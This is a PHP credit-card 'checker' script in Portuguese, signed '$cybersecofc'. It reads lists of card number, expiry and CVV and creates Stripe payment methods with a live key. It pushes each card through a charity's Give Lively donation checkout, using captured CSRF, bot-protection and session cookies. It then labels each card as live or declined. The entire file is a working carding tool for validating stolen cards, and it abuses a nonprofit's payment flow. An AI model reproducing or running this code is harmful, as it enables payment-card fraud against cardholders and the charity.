<?php
error_reporting(0);
set_time_limit(0);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    if (!isset($str[1])) return '';
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

if (strlen($ano) == 2) {
    $ano = "20" . $ano;
}

function detectarBandeira($cc) {
    if (preg_match('/^4/', $cc)) return 'Visa';
    if (preg_match('/^(5|2)/', $cc)) return 'Mastercard';
    if (preg_match('/^3/', $cc)) return 'Amex';
    if (preg_match('/^6/', $cc)) return 'Elo';
    return 'Desconhecida';
}

$bandeira = detectarBandeira($cc);
$inicio = microtime(true);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/x-www-form-urlencoded',
    'Authorization: Bearer pk_live_GWQnyoQBA8QSySDV4tPMyOgI'
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'type' => 'card',
    'card[number]' => $cc,
    'card[exp_month]' => $mes,
    'card[exp_year]' => $ano,
    'card[cvc]' => $cvv
]));

$response1 = curl_exec($ch);
curl_close($ch);

preg_match('/"id":\s*"([^"]+)"/', $response1, $id_match);
$payment_method_id = $id_match[1] ?? '';

if (empty($payment_method_id)) {
    preg_match('/"message":\s*"([^"]+)"/', $response1, $error_msg);
    $erro = $error_msg[1] ?? 'Falha ao criar payment method';
    die('<span class="badge badge-danger">❌ REPROVADA</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">'.$erro.'</span> ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure.givelively.org/carts/a2f7ae99-9397-43fa-bab8-a53d8a773692/payment_intents/checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: secure.givelively.org',
    'sec-ch-ua-platform: "Windows"',
    'x-csrf-token: lMyUh_Vt8-CmppfsClRiNIHNgUlaDv8G_BePOvICzN82M9dKjcJl0EaWNjB5MNBiinfoLt9mBu74psXQHqNqVw',
    'sec-ch-ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
    'sec-ch-ua-mobile: ?0',
    'baggage: sentry-environment=production,sentry-release=532ab9a4d83540e050038551f97e34766c74dbcd,sentry-public_key=566034783d2d45de86e5217dc9b8b1e4,sentry-trace_id=257aa4cfddde45cf9932cad323b749dd,sentry-sample_rate=0.035,sentry-sampled=false',
    'sentry-trace: 257aa4cfddde45cf9932cad323b749dd-90b8df7dddbad44b-0',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'accept: application/json',
    'content-type: application/json',
    'x-datadome-clientid: CmsaXqitOdKPuI9JSsrYm~XC_lTMq3b5L6AGWJ1ZmlSM9sNg2d56HUchSX_81uVHeH~ZLgeLXRYkVj~GNRMZUf_kpaflzzCxWGxFf8RuS4cpZDWNAX2L_Ur2dG~nLW6v',
    'origin: https://secure.givelively.org',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'sec-fetch-storage-access: active',
    'referer: https://secure.givelively.org/donate/echoing-green-foundation/cart/a2f7ae99-9397-43fa-bab8-a53d8a773692/payment-details',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i'
]);
curl_setopt($ch, CURLOPT_COOKIE, '_ga=GA1.1.572972787.1775351778; _hjSessionUser_1561839=eyJpZCI6ImM3MWQ0NzI1LWQ3MjYtNTJjYi1hMDc4LWUwOGRjYjFlMzU5ZCIsImNyZWF0ZWQiOjE3NzUzNTE3ODA1NzIsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1561839=eyJpZCI6IjUwYjM1ZTFlLTgwODQtNGFjNC05NmZjLTIzMTA3MzI2NzhiNCIsImMiOjE3NzU4NzAyMjcyODQsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; datadome=CmsaXqitOdKPuI9JSsrYm~XC_lTMq3b5L6AGWJ1ZmlSM9sNg2d56HUchSX_81uVHeH~ZLgeLXRYkVj~GNRMZUf_kpaflzzCxWGxFf8RuS4cpZDWNAX2L_Ur2dG~nLW6v');
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'checkout' => [
        'name' => 'wgs wssfg',
        'email' => 'cyber@gmail.com',
        'payment_method_id' => $payment_method_id,
        'payment_method_type' => strtolower($bandeira),
        'transaction_fee_covered' => false,
        'tip_amount' => 0,
        'order_tracking_attributes' => [
            'page_url' => null,
            'referrer_url' => 'https://echoinggreen.org/donate/',
            'utm_source' => null,
            'widget_type' => 'simple_donation',
            'widget_url' => 'https://echoinggreen.org/donate/'
        ],
        'donor_information' => new stdClass(),
        'answers_attributes' => []
    ],
    'anonymous_to_public' => false,
    'donation_page_context_id' => 'cf7a82ed-4823-485f-aaef-b9396acf8207',
    'donation_page_context_type' => 'Nonprofit',
    'access_token' => 'eWfQ22Gb6YufjtmevP62gUxBT16ASTQ8NowbLuF3vLw',
    'idempotency_key' => uniqid()
]));

echo$response2 = curl_exec($ch);
$httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$tempo = microtime(true) - $inicio;
$tempoFormatado = number_format($tempo, 2);

$data = json_decode($response2, true);


$mensagem_real = '';

if (isset($data['message']) && is_array($data['message'])) {
    $mensagem_real = implode(' ', $data['message']);
} elseif (isset($data['message']) && is_string($data['message'])) {
    $mensagem_real = $data['message'];
} elseif (isset($data['errors']) && is_array($data['errors'])) {
    $mensagem_real = implode(' ', $data['errors']);
} elseif (isset($data['error']['message'])) {
    $mensagem_real = $data['error']['message'];
} elseif (isset($data['error'])) {
    $mensagem_real = is_array($data['error']) ? json_encode($data['error']) : $data['error'];
}

if (empty($mensagem_real)) {
    preg_match('/"message":\s*"([^"]+)"/', $response2, $msg_match);
    $mensagem_real = $msg_match[1] ?? 'Cartao recusado';
}



if ($httpCode2 == 200 && isset($data['success']) && $data['success'] === true) {
    die('<span class="badge badge-success">✅ APROVADA</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-success">💰 PAGAMENTO CONFIRMADO!</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

if (stripos($mensagem_real, 'cvv') !== false || stripos($mensagem_real, 'security code') !== false || stripos($mensagem_real, 'CVC') !== false) {
    die('<span class="badge badge-success">✅ APROVADA (LIVE - CVV Incorreto)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-success">💰 ' . $mensagem_real . '</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

if (stripos($mensagem_real, 'insufficient') !== false || stripos($mensagem_real, 'funds') !== false) {
    die('<span class="badge badge-success">✅ APROVADA (LIVE - Saldo Insuficiente)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-success">💰 ' . $mensagem_real . '</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

if (stripos($mensagem_real, 'expired') !== false) {
    die('<span class="badge badge-danger">❌ REPROVADA (Cartão Expirado)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">📅 ' . $mensagem_real . '</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
}

die('<span class="badge badge-danger">❌ REPROVADA</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">' . $mensagem_real . '</span> ➔ <span class="badge badge-info">Bandeira: '.$bandeira.'</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning">$cybersecofc</span><br>');
?>